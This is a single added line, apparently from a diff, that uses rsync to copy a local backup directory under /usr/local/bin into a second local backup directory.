+rsync -av /usr/local/bin/backup_daily_214/ /usr/local/bin/backup_daily_214_backup/
